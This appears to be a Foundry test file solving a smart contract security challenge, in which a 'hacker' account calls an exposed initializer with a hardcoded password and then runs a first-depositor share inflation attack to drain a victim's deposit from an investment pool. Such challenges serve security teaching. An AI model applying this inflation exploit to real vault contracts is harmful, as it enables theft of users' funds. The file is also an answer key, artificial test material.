// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/poolToken.sol";
import "../src/investPool.sol";

contract Hack is Test {
    PoolToken token;
    InvestPool pool;
    address user = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        token = new PoolToken();
        pool = new InvestPool(address(token));

        token.mint(2000e18);
        token.transfer(user, 1000e18);
        token.transfer(hacker, 1000e18);

        vm.prank(user);
        token.approve(address(pool), type(uint).max);

        vm.prank(hacker);
        token.approve(address(pool), type(uint).max);
    }

    function userDeposit(uint amount) public {
        vm.startPrank(user);
        pool.deposit(amount);
        vm.stopPrank();
    }

    function test_hack() public {
        uint hackerBalanceBeforeHack = token.balanceOf(hacker);
		vm.startPrank(hacker);

        // solution

        // Part 1: initialize the pool with the password
        string memory _password = "j5kvj49djym590dcjbm7034uv09jih094gjcmjg90cjm58bnginxxx";
        pool.initialize(_password);

        // Part 2: exploit first depositor inflation attack
        pool.deposit(1);
        token.transfer(address(pool), 100 ether);
        vm.stopPrank();
        userDeposit(token.balanceOf(user));
        vm.startPrank(hacker);
        pool.withdrawAll();

		vm.stopPrank();
        assertGt(token.balanceOf(hacker), hackerBalanceBeforeHack);
    }
}